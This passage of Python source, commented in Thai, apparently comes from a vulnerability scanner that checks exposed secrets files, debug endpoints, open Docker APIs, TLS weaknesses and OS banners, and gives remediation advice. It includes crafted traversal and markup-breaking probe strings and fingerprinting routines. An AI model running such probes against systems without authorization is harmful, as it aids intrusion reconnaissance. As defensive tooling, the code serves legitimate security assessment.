    for key in ("packages", "packages-dev"):
        for p in data.get(key, []) or []:
            nm = p.get("name") or ""
            ver = (p.get("version") or "").lstrip("vV").strip()
            if nm and ver and not ver.startswith("dev-") and re.search(r"\d", ver):
                out.append({"name": nm, "version": ver})
    # composer.json: require/require-dev เป็น constraint (เช่น "^8.1") — ข้าม ไม่ใช่เวอร์ชันติดตั้งจริง
    return out


def _probe_exposures(session, base, prefix, timeout, fp=None):
    """ตรวจไฟล์/endpoint ที่เปิดเผย (.env/.git/composer/phpinfo/server-status/backup)
    — ยืนยันด้วย validator กันผลบวกปลอม คืน {EXPOSURE-<slug>: finding}
    ถ้า composer.lock เปิดเผย → แยกแพ็กเกจเก็บใน fp['composer_packages'] ให้ online lookup เทียบ CVE"""
    out = {}
    t = min(timeout, 5.0)
    for path, name, sev, validator in EXPOSURE_CHECKS:
        try:
            r = session.get(base + prefix + path, timeout=t, allow_redirects=False)
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        full = r.text or ""
        body = full[:8000]
        if validator and not re.search(validator, body, re.I):
            continue
        slug = path.strip("/").replace("/", "-").replace(".", "")
        key = f"EXPOSURE-{slug}"
        reason = f"เข้าถึง {path} ได้ (HTTP 200) — {name} ควรปิดและตรวจสอบว่าถูกเข้าถึงไปแล้วหรือไม่"
        if path == "/composer.lock" and fp is not None:
            pkgs = _parse_composer_lock(full)
            if pkgs:
                fp["composer_packages"] = pkgs
                reason += f" | แยกได้ {len(pkgs)} แพ็กเกจ (จะเทียบ CVE ถ้าเปิด online lookup)"
        out[key] = {
            "cve": key, "name": name, "severity": sev,
            "trigger": f"เข้าถึง {path} ได้จากภายนอก (HTTP 200 + ยืนยันเนื้อหา)",
            "host_check": f"ปิดการเข้าถึง {path} ที่ web server (deny/location) และหมุนเวียน secret ที่รั่วทันที",
            "status": "vulnerable",
            "reason": reason,
        }
    return out


def _probe_framework(session, base, prefix, fp, timeout):
    """ตรวจ framework debug/profiler ที่เปิดทิ้งไว้ (Laravel Ignition, Symfony profiler, Yii Gii) + Slim"""
    out = {}
    t = min(timeout, 5.0)
    try:
        r = session.get(base + prefix + "/_ignition/health-check", timeout=t, allow_redirects=False)
        low = (r.text or "").lower()
        if r.status_code == 200 and ("can_execute" in low or "ignition" in low or "\"healthy\"" in low):
            out["CVE-2021-3129"] = {
                "cve": "CVE-2021-3129", "name": "Laravel Ignition RCE (CVE-2021-3129)",
                "severity": "Critical", "trigger": "เข้าถึง /_ignition/health-check ได้ (HTTP 200)",
                "host_check": "ตั้ง APP_DEBUG=false ใน .env และอัปเดต facade/ignition >= 2.5.2",
                "status": "vulnerable",
                "reason": "พบ Laravel Ignition debug mode เปิดอยู่ — เสี่ยงต่อ CVE-2021-3129 (Remote Code Execution ผ่าน php://filter deserialize log) ควรปิด APP_DEBUG บนโปรดักชันทันที",
            }
            if "Laravel" not in fp.get("stack", []):
                fp.setdefault("stack", []).append("Laravel")
    except requests.RequestException:
        pass
    try:
        r = session.get(base + prefix + "/_profiler", timeout=t, allow_redirects=False)
        low = (r.text or "").lower()
        if r.status_code == 200 and "symfony" in low and ("profiler" in low or "web profiler" in low):
            out["FRAMEWORK-Symfony-Profiler"] = {
                "cve": "FRAMEWORK-Symfony-Profiler", "name": "Symfony Web Profiler เปิดสาธารณะ",
                "severity": "High", "trigger": "เข้าถึง /_profiler ได้",
                "host_check": "ปิด web profiler ในโปรดักชัน (เอา symfony/web-profiler-bundle ออกหรือจำกัด IP)",
                "status": "vulnerable",
                "reason": "Symfony Web Profiler เข้าถึงได้จากภายนอก — เผย config/query/เส้นทาง/ตัวแปร debug",
            }
            if "Symfony" not in fp.get("stack", []):
                fp.setdefault("stack", []).append("Symfony")
    except requests.RequestException:
        pass
    try:
        r = session.get(base + prefix + "/index.php?r=gii", timeout=t, allow_redirects=False)
        low = (r.text or "").lower()
        if r.status_code == 200 and ("welcome to gii" in low or "gii module" in low or "<title>gii" in low):
            out["FRAMEWORK-Yii-Gii"] = {
                "cve": "FRAMEWORK-Yii-Gii", "name": "Yii Framework Gii Code Generator เปิดสาธารณะ",
                "severity": "Critical", "trigger": "เข้าถึง ?r=gii ได้จากภายนอก (HTTP 200)",
                "host_check": "จำกัด IP (allowedIPs) ในคอนฟิก gii หรือปิดโมดูลใน Production",
                "status": "vulnerable",
                "reason": "พบ Yii Gii Code Generator เปิดสาธารณะ — สามารถใช้สร้างไฟล์และรันคำสั่งอันตรายบนเซิร์ฟเวอร์ได้โดยตรง",
            }
            if "Yii" not in fp.get("stack", []):
                fp.setdefault("stack", []).append("Yii")
    except requests.RequestException:
        pass
    hdrs = fp.get("headers", {}) or {}
    if "x-debug-token" in hdrs or "x-debug-token-link" in hdrs:
        out.setdefault("FRAMEWORK-Symfony-Debug", {
            "cve": "FRAMEWORK-Symfony-Debug", "name": "Symfony debug mode (X-Debug-Token)",
            "severity": "Medium", "trigger": "พบ header X-Debug-Token",
            "host_check": "ตั้ง APP_ENV=prod / APP_DEBUG=0 ในโปรดักชัน",
            "status": "vulnerable-conditions",
            "reason": "พบ header X-Debug-Token — Symfony อาจรันในโหมด debug บนโปรดักชัน ควรปิด",
        })
    x_pow = " ".join(hdrs.get("x-powered-by", []) or []).lower()
    if "slim" in x_pow:
        if "Slim" not in fp.get("stack", []):
            fp.setdefault("stack", []).append("Slim")
    return out


def _probe_container_layer(session, base, fp, timeout):
    """ตรวจจับการเปิดเผยพอร์ตและ API ของ Docker / Kubernetes / Registry (กลุ่ม 5 ThaiCERT)"""
    out = {}
    host = urlparse(base).hostname or ""
    t = min(timeout, 4.0)
    # 1. Docker Remote API บนพอร์ต 2375 (HTTP plain unauthenticated)
    try:
        r = session.get(f"http://{host}:2375/version", timeout=t, allow_redirects=False)
        if r.status_code == 200 and ("ApiVersion" in r.text or "docker" in r.text.lower()):
            ver = ""
            try:
                ver = r.json().get("Version", "")
            except Exception:
                pass
            out["CONTAINER-Docker-API"] = {
                "cve": "CONTAINER-Docker-API",
                "name": f"Docker Daemon API (2375) เปิดสาธารณะ{' v' + ver if ver else ''}",
                "severity": "Critical",
                "trigger": "พอร์ต 2375 เข้าถึง Docker REST API ได้โดยไม่ต้องยืนยันตัวตน",
                "host_check": "ปิดการ bind 0.0.0.0:2375 ใน dockerd หรือเปิด TLS authentication (--tlsverify)",
                "status": "vulnerable",
                "reason": "Docker Daemon API (พอร์ต 2375) เปิดสาธารณะโดยไม่ยืนยันตัวตน — ผู้โจมตีสามารถสั่งรัน Container เพื่อยึดสิทธิ์ระดับ root ของโฮสต์ได้ทันที",
            }
            if "Docker" not in fp.get("stack", []):
                fp.setdefault("stack", []).append("Docker Engine")
    except requests.RequestException:
        pass

    # 2. Private Docker Registry v2 API (พอร์ต 5000 หรือ path /v2/_catalog)
    for reg_url in (f"http://{host}:5000/v2/_catalog", f"{base}/v2/_catalog"):
        try:
            r = session.get(reg_url, timeout=t, allow_redirects=False)
            if r.status_code == 200 and "repositories" in (r.text or ""):
                out["CONTAINER-Docker-Registry"] = {
                    "cve": "CONTAINER-Docker-Registry",
                    "name": "Docker Registry v2 API เปิดสาธารณะ (Unauthenticated)",
                    "severity": "High",
                    "trigger": f"เข้าถึง {reg_url} ได้โดยไม่ต้องยืนยันตัวตน (HTTP 200)",
                    "host_check": "เปิดใช้งาน Basic Auth หรือ Token Authentication สำหรับ Docker Registry",
                    "status": "vulnerable",
                    "reason": "พบ Private Docker Registry API เปิดสาธารณะ — สามารถดูและดึง (pull) Container Image ขององค์กรออกไปได้",
                }
                if "Docker Registry" not in fp.get("stack", []):
                    fp.setdefault("stack", []).append("Docker Registry")
                break
        except requests.RequestException:
            pass
    return out


# WAF / security proxy ที่หน้าเว็บ — ตรวจจาก header/cookie (ไม่ยิง request เพิ่ม)
WAF_SIGS = [
    ("Cloudflare", [r"cf-ray", r"server:\s*cloudflare", r"__cfduid", r"cf_clearance", r"cf-cache-status"]),
    ("Sucuri", [r"x-sucuri-id", r"x-sucuri-cache", r"server:\s*sucuri"]),
    ("Akamai", [r"akamaighost", r"x-akamai", r"akamai-"]),
    ("Imperva Incapsula", [r"x-iinfo", r"incap_ses", r"visid_incap", r"incapsula"]),
    ("AWS WAF/ALB", [r"awselb", r"x-amzn-waf", r"x-amz-cf-id"]),
    ("F5 BIG-IP ASM", [r"x-wa-info", r"bigipserver", r"\bts[0-9a-f]{8}=", r"x-cnection"]),
    ("ModSecurity", [r"mod_security", r"modsecurity"]),
    ("Wordfence", [r"x-wordfence", r"wordfence"]),
    ("Fortinet FortiWeb", [r"fortiweb", r"x-fw-debug"]),
    ("Barracuda", [r"barracuda", r"barra_counter"]),
    ("Sucuri CloudProxy", [r"cloudproxy"]),
    ("StackPath/MaxCDN", [r"stackpath", r"x-sp-"]),
]


def _detect_waf(fp):
    """ตรวจ WAF/security proxy จาก fp['headers'] — เก็บชื่อใน fp['waf'] (ไม่ยิง request เพิ่ม)"""
    if fp.get("waf"):
        return fp["waf"]
    H = fp.get("headers", {}) or {}
    blob = " ".join(f"{k}: {v}" for k, vs in H.items() for v in vs).lower()
    blob += " " + " ".join(H.get("set-cookie", [])).lower()
    for name, sigs in WAF_SIGS:
        if any(re.search(s, blob) for s in sigs):
            fp["waf"] = name
            return name
    return None


def _probe_tls(host, port, timeout, fp=None):
    """ตรวจ TLS จริงด้วย handshake: cert หมดอายุ/ใกล้หมด/self-signed + รองรับโปรโตคอลอ่อน (TLS 1.0/1.1)
    คืน {TLS-*: finding} และเขียนสรุปกลับเข้า fp (tls_version/cert_expiry/cert_days_left/cert_problem)"""
    import ssl
    import socket as _sk
    out = {}
    t = min(timeout, 6.0)

    def _finding(key, name, sev, status, reason, hc):
        out[key] = {"cve": key, "name": name, "severity": sev, "trigger": "ตรวจ TLS handshake",
                    "host_check": hc, "status": status, "reason": reason}

    # 1) เชื่อมต่อแบบ verify → อ่าน cert + โปรโตคอลที่ตกลงได้
    cert, verify_err = None, None
    try:
        ctx = ssl.create_default_context()
        with _sk.create_connection((host, port), timeout=t) as s:
            with ctx.wrap_socket(s, server_hostname=host) as ss:
                cert = ss.getpeercert()
                if fp is not None:
                    fp["tls_version"] = ss.version()
    except ssl.SSLCertVerificationError as e:
        verify_err = str(e)
        if fp is not None:
            fp["cert_problem"] = str(e)
    except Exception:
        return out  # เชื่อมต่อ TLS ไม่ได้ (อาจไม่ใช่ HTTPS) — ข้าม

    # ถ้า verify ไม่ผ่าน ลองอ่าน cert แบบไม่ verify เพื่อระบุสาเหตุ
    if cert is None:
        try:
            ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx2.check_hostname = False
            ctx2.verify_mode = ssl.CERT_NONE
            with _sk.create_connection((host, port), timeout=t) as s:
                with ctx2.wrap_socket(s, server_hostname=host) as ss:
                    cert = ss.getpeercert(binary_form=False) or {}
        except Exception:
            cert = {}
        emsg = (verify_err or "").lower()
        if "self signed" in emsg or "self-signed" in emsg:
            _finding("TLS-SelfSigned", "ใบรับรอง TLS แบบ self-signed", "Medium", "vulnerable-conditions",
                     "ใบรับรองเป็น self-signed — ไคลเอนต์เตือน/ถูกปลอมได้ง่าย ควรใช้ CA ที่เชื่อถือ (เช่น Let's Encrypt)",
                     "ออกใบรับรองจาก CA ที่เชื่อถือและตั้งค่า chain ให้ครบ")
        elif "hostname mismatch" in emsg or "doesn't match" in emsg:
            _finding("TLS-HostnameMismatch", "ชื่อในใบรับรอง TLS ไม่ตรงกับโดเมน", "Medium", "vulnerable-conditions",
                     f"ใบรับรองไม่ครอบคลุมโฮสต์นี้ ({verify_err[:80]}) — เบราว์เซอร์จะเตือน",
                     "ออกใบรับรองที่มี SAN ตรงกับโดเมนที่ให้บริการ")
        elif "expired" in emsg:
            _finding("TLS-Expired", "ใบรับรอง TLS หมดอายุ", "High", "vulnerable",
                     f"ใบรับรองหมดอายุแล้ว ({verify_err[:80]}) — ผู้ใช้เข้าไม่ได้/ถูกเตือน", "ต่ออายุใบรับรองทันที")
        else:
            _finding("TLS-VerifyFailed", "ตรวจสอบใบรับรอง TLS ไม่ผ่าน", "Medium", "vulnerable-conditions",
                     f"verify ไม่ผ่าน: {verify_err[:100]}", "ตรวจสอบใบรับรอง/chain/วันหมดอายุ")

    # 2) วันหมดอายุ (เมื่ออ่าน notAfter ได้)
    na = (cert or {}).get("notAfter")
    if na:
        try:
            days = (ssl.cert_time_to_seconds(na) - time.time()) / 86400.0
            if fp is not None:
                fp["cert_expiry"] = na
                fp["cert_days_left"] = int(days)
            if days < 0:
                _finding("TLS-Expired", "ใบรับรอง TLS หมดอายุ", "High", "vulnerable",
                         f"ใบรับรองหมดอายุแล้ว (notAfter {na})", "ต่ออายุใบรับรองทันที")
            elif days < 30:
                _finding("TLS-Expiring", "ใบรับรอง TLS ใกล้หมดอายุ", "Medium", "medium-risk",
                         f"ใบรับรองจะหมดอายุใน {int(days)} วัน (notAfter {na})", "ตั้งต่ออายุอัตโนมัติ (เช่น certbot)")
        except Exception:
            pass

    # 3) โปรโตคอลอ่อน — ลองบังคับ TLS 1.0 / 1.1 (best-effort; OpenSSL ใหม่อาจ offer ไม่ได้)
    for label, ver, key in (("TLS 1.0", getattr(ssl.TLSVersion, "TLSv1", None), "TLS-TLS10"),
                            ("TLS 1.1", getattr(ssl.TLSVersion, "TLSv1_1", None), "TLS-TLS11")):
        if ver is None:
            continue
        try:
            import warnings
            c = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            c.check_hostname = False
            c.verify_mode = ssl.CERT_NONE
            # ตั้ง TLS 1.0/1.1 โดยตั้งใจเพื่อทดสอบว่าเซิร์ฟเวอร์ยังรับโปรโตคอลอ่อนไหม
            # (Python เตือน deprecated — เป็นเรื่องปกติของการทดสอบนี้ จึงปิด warning เฉพาะจุด)
            with warnings.catch_warnings():
                warnings.simplefilter("ignore", DeprecationWarning)
                c.minimum_version = ver
                c.maximum_version = ver
            with _sk.create_connection((host, port), timeout=t) as s:
                with c.wrap_socket(s, server_hostname=host) as ss:
                    neg = ss.version()
            if neg:  # handshake สำเร็จ = เซิร์ฟเวอร์ยอมรับโปรโตคอลอ่อน
                _finding(key, f"เซิร์ฟเวอร์ยอมรับ {label} (โปรโตคอลอ่อน)", "Medium", "medium-risk",
                         f"เซิร์ฟเวอร์ยังรับการเชื่อมต่อ {label} ซึ่งเลิกใช้แล้ว (PCI/มาตรฐานห้าม) ควรปิดให้เหลือ TLS 1.2/1.3",
                         f"ปิด {label} ที่ web server (ssl_protocols TLSv1.2 TLSv1.3)")
        except Exception:
            pass  # เชื่อมต่อไม่ได้ = ไม่รองรับ (ดี) หรือ client ทำ TLS เก่าไม่ได้
    return out


def _is_private_ip(ip):
    """IP อยู่ในวง LAN (RFC1918 / loopback / link-local) หรือไม่ — True/False/None(ระบุไม่ได้)"""
    import ipaddress
    if not ip:
        return None
    try:
        a = ipaddress.ip_address(ip)
        return bool(a.is_private or a.is_loopback or a.is_link_local)
    except ValueError:
        return None


# คำแนะนำโหมด LAN แบบ "แสดงครั้งเดียวต่อการสแกน" (กันสแปมตอนหลายโฮสต์/หลายเธรด)
_LAN_HINTS = {}
_LAN_HINT_LOCK = Lock()


def _lan_hint(kind, msg):
    with _LAN_HINT_LOCK:
        if _LAN_HINTS.get(kind):
            return
        _LAN_HINTS[kind] = True
    print(msg)


# path disclosure ใน error/stack trace → บ่งชี้ OS
_PATH_OS = [
    (re.compile(r"[a-z]:\\(?:inetpub|windows|wwwroot)", re.I), "Windows (IIS/Win)"),
    (re.compile(r"[a-z]:\\xampp", re.I), "Windows (XAMPP)"),
    (re.compile(r"[a-z]:\\(?:wamp64|wamp|laragon)", re.I), "Windows (WAMP/Laragon)"),
    (re.compile(r"[a-z]:\\[\w\\]", re.I), "Windows"),
    (re.compile(r"/var/www|/usr/share/nginx|/home/[\w.\-]+/public_html|/opt/lampp", re.I), "Linux/Unix"),
    (re.compile(r"/Users/[\w.\-]+/", re.I), "macOS"),
]
# framework/engine debug/error page signature → engine
_ERR_ENGINE = [
    (re.compile(r"whoops\b|illuminate\\\\|laravel", re.I), "Laravel (debug/Whoops)"),
    (re.compile(r"symfony\\\\component|twig_error|web profiler", re.I), "Symfony (debug)"),
    (re.compile(r"traceback \(most recent|werkzeug|djangoproject|flask", re.I), "Python (Django/Flask)"),
    (re.compile(r"actioncontroller|action_dispatch|rails", re.I), "Ruby on Rails"),
    (re.compile(r"asp\.net|aspxerrorpath|system\.web", re.I), "ASP.NET (Windows)"),
    (re.compile(r"apache tomcat/|org\.apache\.(?:tomcat|catalina)", re.I), "Apache Tomcat (Java)"),
    (re.compile(r"org\.springframework|whitelabel error page", re.I), "Spring Boot (Java)"),
    (re.compile(r"cannot get /|at layer\.handle", re.I), "Node.js/Express"),
]


def _probe_error_pages(session, base, prefix, fp, timeout):
    """ยิง request ให้เกิด error page (404/400) แล้วดึง OS/engine/เวอร์ชันที่หน้า error มักรั่ว
    — Apache default page โชว์ 'Apache/2.4.41 (Ubuntu)' (ได้ทั้ง server + OS); PHP/stack trace โชว์ path → OS;
      framework debug page → engine. เติม fp เฉพาะช่องที่ยังว่าง (ไม่ทับผลที่ยืนยันแล้ว)
    คืน {EXPOSURE-ErrorLeak: finding} ถ้าหน้า error เปิดเผยข้อมูลภายในมากเกินไป"""
    import uuid as _uuid
    t = min(timeout, 5.0)
    out = {}
    paths = [f"{prefix}/{_uuid.uuid4().hex[:10]}-notexist", f"{prefix}/%c0%ae%c0%ae/", f"{prefix}/'\"><x"]
    verbose = False
    for path in paths:
        try:
            r = session.get(base + path, timeout=t, allow_redirects=False)
        except requests.RequestException:
            continue
        blob = " ".join(f"{k}: {v}" for k, v in r.headers.items()) + "\n" + (r.text or "")[:8000]
        low = blob.lower()
        # 1) server family + version (หน้า error มักโชว์แม้ header หน้าแรกถูกซ่อน)
        if fp.get("server_family", "Unknown") == "Unknown" or not fp.get("server_version"):
            for pat, fam in SERVER_SIGS:
                m = pat.search(blob)
                if m:
                    if fp.get("server_family", "Unknown") == "Unknown":
                        fp["server_family"] = fam
                    if m.lastindex and m.group(1) and not fp.get("server_version"):
                        fp["server_version"] = m.group(1)
                    break
        # 2) OS token ในวงเล็บ เช่น Apache "...(Ubuntu)" → os + os_version (เชื่อมั่นสูง)
        if not fp.get("os_version"):
            for pm in OS_PAREN_RE.finditer(blob):
                tok = pm.group(1).strip()
                name = next((nm for pat, nm in OS_PATTERNS if pat.search(tok)), "")
                if name:
                    fp["os"], fp["os_version"] = name, tok
                    fp["os_source"], fp["os_confidence"] = "error page (Server token)", "สูง"
                    break
        # 3) โมดูล (OpenSSL/mod_* ฯลฯ) ที่รั่วใน error page
        mm = MODULE_VER_RE.search(blob)
        if mm:
            fp.setdefault("modules", {}).setdefault(mm.group(1), mm.group(2))
        # 4) PHP version จาก error/stack trace
        if isinstance(fp.get("php_versions"), set):
            for m in VERSION_RE.finditer(blob):
                fp["php_versions"].add(m.group(1)); fp["php_detected"] = True
        # 5) path disclosure → OS (ถ้ายังไม่รู้)
        if fp.get("os", "Unknown") in ("", "Unknown"):
            for rx, osname in _PATH_OS:
                if rx.search(blob):
                    fp["os"] = osname
                    fp["os_source"], fp["os_confidence"] = "error page (path disclosure)", "ปานกลาง"
                    break
        # 6) framework/engine debug signature
        for rx, eng in _ERR_ENGINE:
            if rx.search(low):
                hints = fp.setdefault("engine_hints", [])
                if eng not in hints:
                    hints.append(eng)
                break
        if (re.search(r"stack trace|traceback|fatal error|uncaught|on line \d+|\.php on line", low)
                or any(rx.search(blob) for rx, _ in _PATH_OS[:5])):
            verbose = True
    if verbose:
        out["EXPOSURE-ErrorLeak"] = {
            "cve": "EXPOSURE-ErrorLeak", "name": "หน้า Error เปิดเผยข้อมูลภายใน (stack trace / path / เวอร์ชัน)",
            "severity": "Low", "trigger": "หน้า error (404/400) แสดง stack trace / เส้นทางไฟล์ / เวอร์ชัน engine",
            "host_check": "ตั้ง custom error page + ปิด display_errors (PHP) / APP_DEBUG=false — อย่าโชว์ debug บนโปรดักชัน",
            "status": "vulnerable-conditions",
            "reason": "หน้า error เปิดเผยข้อมูลที่ช่วยผู้โจมตี (เส้นทางไฟล์/OS/เวอร์ชัน engine/stack trace) ควรปิด debug และใช้ custom error page",
        }
    return out


def _grab_banner(ip, port, timeout, probe=None):
    """เปิด TCP อ่าน banner บรรทัดแรก (pure-Python ไม่พึ่ง nmap/root) — '' ถ้าไม่ได้"""
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        if s.connect_ex((ip, port)) != 0:
            return ""
        if probe:
            try:
                s.sendall(probe)
            except Exception:
                pass
        return s.recv(256).decode("latin-1", "replace").strip()
    except Exception:
        return ""
    finally:
        try:
            s.close()
        except Exception:
            pass


def _tcp_open(ip, port, timeout):
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        return s.connect_ex((ip, port)) == 0
    except Exception:
        return False
    finally:
        s.close()


# SSH banner → distro (เรียงจากเจาะจงไปทั่วไป)
_SSH_OS = [
    (r"for_windows|windows", "Windows (OpenSSH)"), (r"ubuntu", "Ubuntu Linux"),
    (r"raspbian", "Raspberry Pi OS (Debian)"), (r"debian", "Debian Linux"),
    (r"\.el9|rhel9|centos.*9", "RHEL/CentOS/Rocky 9"), (r"\.el8|centos.*8", "RHEL/CentOS/Rocky 8"),
    (r"\.el7|centos.*7", "RHEL/CentOS 7"), (r"centos|red\s*hat|rhel", "RHEL/CentOS"),
    (r"freebsd", "FreeBSD"), (r"openbsd", "OpenBSD"), (r"netbsd", "NetBSD"),
    (r"sun_ssh|solaris", "Solaris"), (r"mikrotik|rosssh", "MikroTik RouterOS (Linux)"),
    (r"cisco", "Cisco IOS"), (r"huawei", "Huawei"), (r"dropbear", "Embedded Linux (Dropbear)"),
    (r"gentoo", "Gentoo Linux"), (r"suse", "SUSE Linux"), (r"arch", "Arch Linux"),
]


def _probe_os_banners(ip, timeout):
    """เดา OS จาก service banner (SSH/FTP/SMTP) + port-profile — pure-Python, ไม่ต้อง nmap/root
    ยิงพอร์ตที่เกี่ยวข้องพร้อมกัน (bounded ~1 timeout) แล้วตัดสินใจตามความเชื่อมั่น
    คืน (os, source, confidence) หรือ (None, None, None)"""
    t = min(max(timeout, 1.0), 2.5)
    res = {}
    jobs = {
        "ssh": lambda: _grab_banner(ip, 22, t),
        "ftp": lambda: _grab_banner(ip, 21, t),
        "smtp": lambda: _grab_banner(ip, 25, t),
        "rdp": lambda: _tcp_open(ip, 3389, t),
        "smb": lambda: _tcp_open(ip, 445, t),
        "nbt": lambda: _tcp_open(ip, 139, t),
        "msrpc": lambda: _tcp_open(ip, 135, t),
    }
    with ThreadPoolExecutor(max_workers=len(jobs)) as ex:
        futs = {ex.submit(fn): k for k, fn in jobs.items()}
        for f in as_completed(futs):
            try:
                res[futs[f]] = f.result()
            except Exception:
                res[futs[f]] = None
    # 1) SSH banner — แม่นสุด
    sb = res.get("ssh") or ""
    if sb.startswith("SSH-"):
        low = sb.lower()
        for pat, name in _SSH_OS:
            if re.search(pat, low):
                return name, f"SSH banner: {sb[:50]}", "สูง"
        if "openssh" in low:
            return "Linux/Unix (OpenSSH)", f"SSH banner: {sb[:50]}", "ปานกลาง"
        return "Linux/Unix (SSH)", f"SSH banner: {sb[:50]}", "ปานกลาง"
    # 2) FTP / SMTP banner
    fb = (res.get("ftp") or "").lower()
    if fb:
        if "microsoft ftp" in fb:
            return "Windows", f"FTP banner: {res['ftp'][:48]}", "สูง"
        if any(x in fb for x in ("vsftpd", "proftpd", "pure-ftpd", "ubuntu", "debian")):
            return "Linux/Unix", f"FTP banner: {res['ftp'][:48]}", "ปานกลาง"
    mb = (res.get("smtp") or "").lower()
    if mb:
        if "microsoft" in mb:
            return "Windows", f"SMTP banner: {res['smtp'][:48]}", "สูง"
        if any(x in mb for x in ("postfix", "exim", "sendmail", "ubuntu", "debian")):
            return "Linux/Unix", f"SMTP banner: {res['smtp'][:48]}", "ปานกลาง"
    # 3) Port-profile — พอร์ตบริการ Windows
    win = [p for p, k in ((3389, "rdp"), (445, "smb"), (139, "nbt"), (135, "msrpc")) if res.get(k)]
    if len(win) >= 2 or 3389 in win:
        return "Windows (น่าจะ)", f"port-profile: เปิด {','.join(map(str, win))}", "ปานกลาง"
    if res.get("ssh") == "" and win:
        return "Windows (น่าจะ)", f"port-profile: เปิด {','.join(map(str, win))}", "ต่ำ-ปานกลาง"
    return None, None, None


def _probe_os(host, fp, timeout, lan=False):
    """เสริมการระบุ OS แบบหลายแหล่ง + ติดป้ายที่มา/ความเชื่อมั่น (ไม่รับประกันถูก 100%):
    1) Server header (เชื่อถือสูง) 2) nmap -O ถ้ามี (ปานกลาง-สูง +%) 3) TTL heuristic
    lan=True (โหมด LAN): nmap ใช้ ARP discovery (แม่นกว่า, ได้ MAC-based OS) + TTL ในวงเดียวกัน
    เชื่อมั่นสูงขึ้น (0–1 hop → initial TTL เกือบตรงเป๊ะ)"""
    import shutil
    import subprocess
    # 1) Server header — ตั้งไว้แล้วตอน fingerprint ถ้า Apache รั่ว OS token
    if fp.get("os_version"):
        fp["os_source"] = fp.get("os_source") or "Server header"
        fp["os_confidence"] = fp.get("os_confidence") or "สูง"
        return
    # 1.5) Banner-based (pure-Python, ไม่ต้อง nmap/root, คอมไพล์เป็น .app/.exe ได้) — SSH/FTP/SMTP + port-profile
    import socket as _sock
    try:
        _ip = _sock.gethostbyname(host)
    except Exception:
        _ip = host
    b_os, b_src, b_conf = _probe_os_banners(_ip, timeout)
    if b_os:
        fp["os"] = b_os
        fp["os_source"] = b_src
        fp["os_confidence"] = b_conf
        return
    # 2) nmap -O (gold standard — ต้องติดตั้ง nmap + สิทธิ์ root; ให้ผลเป็น % ความมั่นใจ)
    #    โหมด LAN: ตัด -Pn ออกให้ nmap ใช้ ARP ping ค้นโฮสต์ (บนวงเดียวกันแม่นและได้ MAC fingerprint)
    if lan and not shutil.which("nmap"):
        _lan_hint("nmap", "  ℹ OS detection: ไม่มี nmap — ใช้วิธี pure-Python แทน (SSH/FTP/SMTP banner + "
                          "port-profile + Server header + TTL + ยี่ห้อ MAC). ติดตั้ง `nmap` (รัน sudo) "
                          "จะได้ TCP/IP stack fingerprint เสริมเมื่อ host ปิด banner หมด")
    if shutil.which("nmap"):
        cmd = (["nmap", "-O", "--osscan-guess", "--host-timeout", "25s", host] if lan
               else ["nmap", "-O", "--osscan-guess", "-Pn", "--host-timeout", "20s", host])
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=35 if lan else 30)
            out = r.stdout or ""
            mm = (re.search(r"OS details:\s*(.+)", out) or
                  re.search(r"Aggressive OS guesses:\s*(.+)", out) or
                  re.search(r"Running:\s*(.+)", out))
            if mm:
                guess = mm.group(1).strip().split(",")[0].strip()
                pm = re.search(r"\((\d+)%\)", mm.group(1))
                # nmap อาจรายงาน MAC + ผู้ผลิตบน LAN — เก็บไว้ใช้ด้วย
                macm = re.search(r"MAC Address:\s*([0-9A-Fa-f:]{17})\s*\(([^)]+)\)", out)
                if macm and not fp.get("mac"):
                    fp["mac"] = macm.group(1).lower()
                    fp["mac_vendor"] = macm.group(2).strip()[:60]
                fp["os"] = re.sub(r"\s*\(\d+%\)", "", guess).strip()
                fp["os_source"] = "nmap -O" + (" (LAN/ARP)" if lan else "")
                fp["os_confidence"] = (f"{pm.group(1)}%" if pm else ("สูง (LAN)" if lan else "ปานกลาง"))
                return
        except Exception:
            pass
    # 3) TTL heuristic — โหมด LAN เชื่อมั่นสูงขึ้นมากเพราะ 0–1 hop (initial TTL เกือบตรงเป๊ะ)
    try:
        r = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True, timeout=4)
        tm = re.search(r"ttl[=\s]+(\d+)", r.stdout or "", re.I)
        if tm:
            ttl = int(tm.group(1))
            for init, name in ((64, "Linux/Unix (หรือ macOS)"), (128, "Windows"),
                               (255, "อุปกรณ์เครือข่าย/BSD/Solaris")):
                if ttl <= init and (init - ttl) <= 32:
                    hops = init - ttl
                    if lan:
                        conf = ("สูง (LAN · 0–1 hop)" if hops <= 1 else f"ปานกลาง (LAN · ~{hops} hop)")
                    else:
                        conf = "ต่ำ (ประมาณการ — ควรยืนยันบนเครื่อง)"
                    fp["os"] = f"{name} [TTL {ttl}]"
                    fp["os_source"] = "TTL heuristic" + (" (LAN)" if lan else "")
                    fp["os_confidence"] = conf
                    return
    except Exception:
        pass


def _analyze_os_kernel(fp):
    """CVE-2026-98432 — Linux kernel IPv4 TCP use-after-free (CVSS 9.8, kernel 4.4+).
    เป็นช่องโหว่ระดับเคอร์เนล มองผ่าน HTTP ไม่เห็น → ผูกกับผล OS fingerprint แล้วแจ้งให้ยืนยันบนเครื่อง
    - Windows ชัดเจน → n/a (ไม่เกี่ยวข้อง)
    - Linux หรือยังระบุ OS ไม่ได้ → unknown (อาจกระทบ ยืนยันแพตช์จากภายนอกไม่ได้)"""
    os_txt = f"{fp.get('os', '')} {fp.get('os_version', '')}".strip()
    low = os_txt.lower()
    base = {
        "cve": "CVE-2026-98432",
        "name": "Linux Kernel TCP Use-After-Free (IPv4 options)",
        "severity": "Critical",
        "trigger": "SYN ที่มี IPv4 options → พอร์ต TCP ที่ listen (network · ไม่ต้องยืนยันตัวตน)",
        "host_check": "ตรวจเวอร์ชันเคอร์เนล `uname -r` แล้วเทียบ advisory ของดิสโทร (fix: commit e3f33b0a1d89); "
                      "อัปเดตเคอร์เนลเป็นรุ่นที่แก้แล้วและรีบูต หรือใช้ live-patch — กระทบ Linux kernel 4.4 ขึ้นไป",
    }
    windows = any(k in low for k in ("windows", " iis", "win64", "win32")) or low.startswith("iis")
